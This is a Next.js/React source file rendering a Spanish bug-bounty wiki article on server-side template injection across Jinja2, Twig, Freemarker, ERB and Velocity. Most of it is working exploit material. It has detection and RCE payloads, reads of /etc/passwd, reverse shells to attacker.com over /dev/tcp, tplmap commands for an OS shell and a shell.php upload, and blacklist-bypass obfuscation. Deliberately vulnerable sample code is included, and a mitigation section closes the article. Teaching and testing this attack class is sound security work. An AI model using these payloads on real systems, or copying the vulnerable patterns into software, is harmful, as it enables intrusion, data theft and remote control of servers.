/**
 * SSTI (SERVER-SIDE TEMPLATE INJECTION)
 * Inyectar código en template engines
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Code2, Terminal, Shield, Flame, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function SSTIContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="SSTI - Cuando los Templates se Vuelven Código">
        <Paragraph>
          <Strong>Server-Side Template Injection (SSTI)</Strong> ocurre cuando user input 
          es insertado directamente en templates (Jinja2, Twig, Freemarker, etc.) permitiendo 
          ejecución de código arbitrario y <Strong>Remote Code Execution</Strong>.
        </Paragraph>

        <AlertDanger title="Impacto Crítico">
          <ul className="mt-2 space-y-1">
            <ListItem>💥 RCE (Remote Code Execution)</ListItem>
            <ListItem>📁 Leer archivos del servidor</ListItem>
            <ListItem>🔐 Robar secrets/environment variables</ListItem>
            <ListItem>🎯 Bypassear autenticación</ListItem>
            <ListItem>⚙️ Escalar privilegios</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="identificacion" title="1. Identificar Template Engine">
        <Paragraph>
          Primer paso: Determinar qué template engine usa la aplicación. Diferentes engines 
          usan sintaxis diferente.
        </Paragraph>

        <CodeBlock
          language="text"
          title="Payloads de detección"
          code={`# Probar estos payloads en inputs:
{{7*7}}           # Jinja2, Twig → Output: 49
\${7*7}           # Freemarker, Velocity → Output: 49
<%= 7*7 %>        # ERB (Ruby) → Output: 49
#{ 7*7 }          # Ruby interpolation → Output: 49
\${{7*7}}         # Smarty → Output: 49
{{7*'7'}}         # Jinja2 → Output: 7777777
\${7*'7'}         # Freemarker → Output: 7777777`}
        />

        <TerminalOutput title="Respuesta de server indica template engine">
          {`# Si input {{7*7}} devuelve:
49           → Jinja2, Twig, o similar
7777777      → Jinja2 (string multiplication)
{{7*7}}      → No template injection / output escaped
Server Error → Posible SSTI con sintaxis incorrecta`}
        </TerminalOutput>
      </Section>

      <Section id="jinja2-rce" title="2. SSTI en Jinja2 (Python Flask)">
        <CodeBlock
          language="python"
          title="❌ VULNERABLE - Render template con user input"
          code={`from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    
    # ❌ VULNERABLE - User input en template string
    template = f"<h1>Hello {name}!</h1>"
    
    return render_template_string(template)

# URL vulnerable:
# /greet?name={{7*7}}
# Output: <h1>Hello 49!</h1>`}
        />

        <CodeBlock
          language="python"
          title="Payload - RCE en Jinja2"
          code={`# Payload básico - Acceder a config
{{config}}

# Payload - Leer /etc/passwd
{{''.__class__.__mro__[1].__subclasses__()[414]('/etc/passwd').read()}}

# Explicación:
# '' → String object
# .__class__ → <class 'str'>
# .__mro__ → Method Resolution Order: [<class 'str'>, <class 'object'>]
# [1] → <class 'object'>
# .__subclasses__() → Todas las subclases de object
# [414] → <class '_io._IOBase'> (número varía por versión Python)
# ('/etc/passwd').read() → Leer archivo`}
        />

        <CodeBlock
          language="python"
          title="Payload avanzado - RCE completo"
          code={`# Encontrar subprocess.Popen en subclasses
{{''.__class__.__mro__[1].__subclasses__()[407]}}
# Output: <class 'subprocess.Popen'>

# Ejecutar comando
{{''.__class__.__mro__[1].__subclasses__()[407](['id'], stdout=-1).communicate()[0].strip()}}

# Reverse shell
{{''.__class__.__mro__[1].__subclasses__()[407](['bash','-c','bash -i >& /dev/tcp/attacker.com/4444 0>&1'], stdout=-1).communicate()}}

# Alternativa con os.popen
{{''.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['popen']('id').read()}}

# Payload genérico (funciona en mayoría de versiones)
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}`}
        />
      </Section>

      <Section id="twig-rce" title="3. SSTI en Twig (PHP Symfony)">
        <CodeBlock
          language="php"
          title="❌ VULNERABLE - Twig template con user input"
          code={`<?php
// Symfony Controller
use Symfony\\Component\\HttpFoundation\\Request;
use Twig\\Environment;

public function greet(Request $request, Environment $twig)
{
    $name = $request->query->get('name', 'Guest');
    
    // ❌ VULNERABLE - createTemplate con user input
    $template = $twig->createTemplate("Hello {{ name }}!");
    
    return $template->render(['name' => $name]);
}
?>`}
        />

        <CodeBlock
          language="text"
          title="Payload - RCE en Twig"
          code={`# Payload básico - Acceder a _self
{{_self}}

# Payload - Ejecutar PHP code
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Explicación:
# _self → Template actual
# .env → Twig environment
# registerUndefinedFilterCallback("exec") → Registrar exec() como filter
# getFilter("id") → Ejecutar filter "id" (que ahora es exec("id"))

# Payload alternativo - system()
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}

# Reverse shell
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'")}}`}
        />
      </Section>

      <Section id="freemarker-rce" title="4. SSTI en Freemarker (Java)">
        <CodeBlock
          language="java"
          title="❌ VULNERABLE - Freemarker template"
          code={`import freemarker.template.Configuration;
import freemarker.template.Template;

public class TemplateController {
    public String greet(String name) throws Exception {
        Configuration cfg = new Configuration();
        
        // ❌ VULNERABLE - User input en template
        String templateString = "<h1>Hello " + name + "!</h1>";
        
        Template template = new Template("greet", new StringReader(templateString), cfg);
        
        StringWriter output = new StringWriter();
        template.process(new HashMap<>(), output);
        
        return output.toString();
    }
}`}
        />

        <CodeBlock
          language="text"
          title="Payload - RCE en Freemarker"
          code={`# Payload - Instanciar java.lang.Runtime
<#assign ex="freemarker.template.utility.Execute"?new()>
\${ ex("id") }

# Payload completo - Reverse shell
<#assign classloader=object?api.class.getClassLoader()>
<#assign owc=classloader.loadClass("freemarker.template.utility.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
\${ dwf.newInstance(ec,null)("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") }`}
        />
      </Section>

      <Section id="erb-rce" title="5. SSTI en ERB (Ruby on Rails)">
        <CodeBlock
          language="ruby"
          title="❌ VULNERABLE - ERB render inline"
          code={`# Ruby on Rails Controller
class GreetController < ApplicationController
  def index
    name = params[:name] || 'Guest'
    
    # ❌ VULNERABLE - ERB.new con user input
    template = ERB.new("<h1>Hello <%= name %>!</h1>")
    
    render html: template.result(binding).html_safe
  end
end`}
        />

        <CodeBlock
          language="ruby"
          title="Payload - RCE en ERB"
          code={`# Payload básico - Ejecutar Ruby code
<%= 7 * 7 %>   → Output: 49

# Payload - Ejecutar comando system
<%= \`id\` %>
<%= system('id') %>

# Payload - Leer archivos
<%= File.open('/etc/passwd').read %>

# Reverse shell
<%= \`bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'\` %>

# Alternativa con IO.popen
<%= IO.popen('id').readlines() %>`}
        />
      </Section>

      <Section id="velocity-rce" title="6. SSTI en Velocity (Java)">
        <CodeBlock
          language="java"
          title="❌ VULNERABLE - Apache Velocity"
          code={`import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;

public String render(String userInput) {
    // ❌ VULNERABLE - Evaluar template con user input
    VelocityContext context = new VelocityContext();
    
    StringWriter writer = new StringWriter();
    Velocity.evaluate(context, writer, "template", userInput);
    
    return writer.toString();
}`}
        />

        <CodeBlock
          language="text"
          title="Payload - RCE en Velocity"
          code={`# Payload - Acceder a Runtime
#set($rt = $Class.forName("java.lang.Runtime"))
#set($chr = $Class.forName("java.lang.Character"))
#set($str = $Class.forName("java.lang.String"))
#set($ex=$rt.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

# Payload simplificado
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end`}
        />
      </Section>

      <Section id="automatizacion" title="7. Automatizar Detección con Tplmap">
        <CodeBlock
          language="bash"
          title="Tplmap - Herramienta de explotación"
          code={`# Instalar
git clone https://github.com/epinna/tplmap
cd tplmap

# Escanear URL vulnerable
python tplmap.py -u 'http://victim.com/greet?name=test'

# Output:
[+] Tplmap 0.5
[+] Testing if GET parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: name
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: linux
  Technique: render
  Capabilities:
   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok

# Ejecutar comando
python tplmap.py -u 'http://victim.com/greet?name=test' --os-cmd 'id'

# Obtener shell interactiva
python tplmap.py -u 'http://victim.com/greet?name=test' --os-shell

# Leer archivos
python tplmap.py -u 'http://victim.com/greet?name=test' --file-read '/etc/passwd'

# Upload shell
python tplmap.py -u 'http://victim.com/greet?name=test' --file-upload shell.php`}
        />
      </Section>

      <Section id="bypass-filters" title="8. Bypass de Filtros">
        <Subsection title="Encoding/Obfuscación">
          <CodeBlock
            language="python"
            title="Bypass de blacklist"
            code={`# Si "class" está bloqueado:
{{''['__cl'+'ass__']}}
{{''|attr('__class__')}}

# Si "mro" está bloqueado:
{{''.__class__['__mr'+'o__']}}

# Si "subclasses" está bloqueado:
{{''.__class__.__mro__[1]|attr('__sub'+'classes__')()}}

# URL encoding
{{%27%27.__class__}}  → {{''.__class__}}

# Unicode escape
{{'\\u005f\\u005fclass\\u005f\\u005f'}}  → {{__class__}}`}
          />
        </Subsection>

        <Subsection title="String Concatenation">
          <CodeBlock
            language="python"
            title="Construir payloads dinámicamente"
            code={`# Jinja2 - Concatenar strings
{% set cmd = 'id' %}
{% set payload = ''.__class__.__mro__[1].__subclasses__()[407]([cmd]).communicate()[0] %}
{{payload}}

# Usar filters
{{'__class__'|replace('_','\\\\_')|replace('\\\\_','_')}}

# Base64 decode payload
{{''.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['popen'](('aWQ='|b64decode).decode()).read()}}`}
          />
        </Subsection>
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Prevenir SSTI">
          NUNCA insertar user input directamente en templates.
        </AlertDanger>

        <Subsection title="1. Usar Variables en Templates (NO String Concatenation)">
          <CodeBlock
            language="python"
            title="✅ SEGURO - Jinja2 con variables"
            code={`from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    
    # ✅ SEGURO - Usar render_template con archivo separado
    # templates/greet.html: <h1>Hello {{ name }}!</h1>
    return render_template('greet.html', name=name)

# Jinja2 automáticamente escapa name
# Input: {{7*7}} → Output: {{7*7}} (literal, no ejecutado)`}
          />
        </Subsection>

        <Subsection title="2. Sandboxing (Última Línea de Defensa)">
          <CodeBlock
            language="python"
            title="✅ Jinja2 Sandbox (limita funcionalidad)"
            code={`from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()

# Sandboxed environment bloquea:
# - Acceso a __class__, __mro__, __subclasses__
# - Import de módulos
# - Llamadas a funciones peligrosas

template = env.from_string("Hello {{ name }}!")
output = template.render(name=user_input)

# Pero CUIDADO: Sandbox NO es 100% seguro
# Mejor: NO usar user input en templates`}
          />
        </Subsection>

        <Subsection title="3. Template Precompilado">
          <CodeBlock
            language="php"
            title="✅ SEGURO - Twig con template precompilado"
            code={`<?php
// ✅ SEGURO - Template en archivo separado
// templates/greet.html.twig: <h1>Hello {{ name }}!</h1>

use Symfony\\Component\\HttpFoundation\\Request;
use Twig\\Environment;
use Twig\\Loader\\FilesystemLoader;

public function greet(Request $request, Environment $twig)
{
    $name = $request->query->get('name', 'Guest');
    
    // ✅ Renderizar template precompilado
    return $twig->render('greet.html.twig', ['name' => $name]);
    
    // Twig auto-escapa: {{name}} → HTML-encoded
}
?>`}
          />
        </Subsection>

        <Subsection title="4. Validación Estricta">
          <CodeBlock
            language="python"
            title="✅ Validar input antes de usar en template"
            code={`import re

def safe_greet(name):
    # ✅ Whitelist de caracteres permitidos
    if not re.match(r'^[a-zA-Z0-9\\s]+$', name):
        raise ValueError('Invalid name format')
    
    # ✅ Limitar longitud
    if len(name) > 50:
        raise ValueError('Name too long')
    
    return render_template('greet.html', name=name)`}
          />
        </Subsection>

        <Subsection title="5. Content Security Policy">
          <CodeBlock
            language="text"
            title="CSP como defensa adicional"
            code={`Content-Security-Policy: 
  default-src 'self'; 
  script-src 'nonce-{random}'; 
  object-src 'none';

# Si SSTI genera <script>, CSP lo bloqueará
# Pero NO confiar solo en CSP - Prevenir SSTI en origen`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: Command Injection</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/command-injection`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Ejecutar comandos OS arbitrarios</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
